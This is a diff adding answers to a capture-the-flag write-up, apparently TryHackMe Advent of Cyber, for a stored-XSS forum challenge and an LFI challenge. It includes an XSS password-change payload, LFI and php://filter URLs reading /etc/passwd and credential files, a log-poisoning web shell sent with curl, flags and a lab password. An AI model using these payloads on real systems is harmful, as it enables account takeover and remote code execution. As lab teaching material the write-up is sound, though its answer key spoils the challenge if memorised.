@@ -125,23 +125,97 @@ After fuzzing, we get the password which can be used for login to get flag.
 ## Pesky Elf Forum
 
 ```markdown
-1. What flag did you get when you disabled the plugin?
+This challenge is about XSS vulnerabilities.
+
+They can be of four types - DOM, Reflected, Stored and Blind.
+
+Now, we login to the given forum link using the creds McSkidy:password.
+
+We change our password to 'pass123', which modifies the URL.
+
+Now, we have to add a comment, exploiting the XSS vulnerability.
+
+Payload: <script>fetch('/settings?new_password=pass123');</script>
+
+We have to logout and login using the Grinch's creds Grinch:pass123
+
+On disabling the plugin, we get the flag.
+```
+
+```markdown
+1. What flag did you get when you disabled the plugin? - THM{NO_MORE_BUTTMAS}
 ```
 
 ## Patch Management Is Hard
 
 ```markdown
-1. What is the entry point for our web application?
+This challenge is about LFI vulnerabilities.
 
-2. Use the entry point to perform LFI to read the /etc/flag file. What is the flag?
+We visit the website at <http://10.10.59.80.p.thmlabs.com>
 
-3. Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value?
+To find an entrypoint, we can use this link and also check the site at <http://10.10.59.80>
 
-4. What are the username and password?
+We can see in the URL that we have the 'err' parameter; this would be our entrypoint for LFI.
 
-5. What is the password of the flag.thm.aoc server?
+Current URL: <http://10.10.59.80/index.php?err=error.txt>
 
-6. What is the hostname of the webserver?
+Modified URL: <http://10.10.59.80/index.php?err=/etc/passwd>
+
+As we have to read /etc/flag, we have to include that in URL.
+
+Modifed URL: <http://10.10.59.80/index/php?err=/etc/flag>
+
+Now, we need to use the PHP filter technique to read the index.php file
+
+Required URL: <http://10.10.59.80/index.php?err=php://filter/convert.base64-encode/resource=/var/www/html/index.php>
+
+The output can be copied and decoded from base64 to get the flag value.
+
+To read the credentials file, we can replace the path of index.php by the credentials file path.
+
+Required URL: <http://10.10.59.80/index.php?err=php://filter/convert.base64-encode/resource=/var/www/html/includes/creds.php>
+
+We can use these creds to login and get the flag in the 'Password Recovery' section.
+
+Now, we have to use LFI to gain RCE via log file page.
+
+Log file page: <http://10.10.59.80/logs.php>
+
+Log file location: ./includes/logs/app_access.log
+
+To get RCE, we need to include PHP code into User-Agent part in the log file.
+
+Command: curl -A "<?php phpinfo();?>" http://10-10-59-80.p.thmlabs.com/index.php
+
+We have to visit log file using LFI.
+
+Required URL: <http://10.10.59.80/index.php?err=php://filter/convert.base64-encode/resource=./includes/logs/app_access.log>
+
+We will have to use this through a private window to avoid the current login session.
+
+This gives us the log file info, so we can now continue with actually doing the RCE bit; we can use log poisoning.
+
+Command: curl -A "<?php system(\$_GET['cmd']);?>" http://10-10-59-80.p.thmlabs.com/index.php
+
+Required URL: <http://10.10.59.80/index.php?err=../../../../var/www/html/includes/logs/app_access.log>
+
+We need to get hostname of web server.
+
+Required URL: <http://10.10.59.80/index.php?err=../../../../var/www/html/includes/logs/app_access.log&cmd=hostname>
+```
+
+```markdown
+1. What is the entry point for our web application? - err
+
+2. Use the entry point to perform LFI to read the /etc/flag file. What is the flag? - THM{d29e08941cf7fe41df55f1a7da6c4c06}
+
+3. Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value? - THM{791d43d46018a0d89361dbf60d5d9eb8}
+
+4. What are the username and password? - McSkidy:A0C315Aw3s0m
+
+5. What is the password of the flag.thm.aoc server? - THM{552f313b52e3c3dbf5257d8c6db7f6f1}
+
+6. What is the hostname of the webserver? - lfi-aoc-awesome-59aedca683fff9261263bb084880c965
 ```
 
 ## Migration Without Security
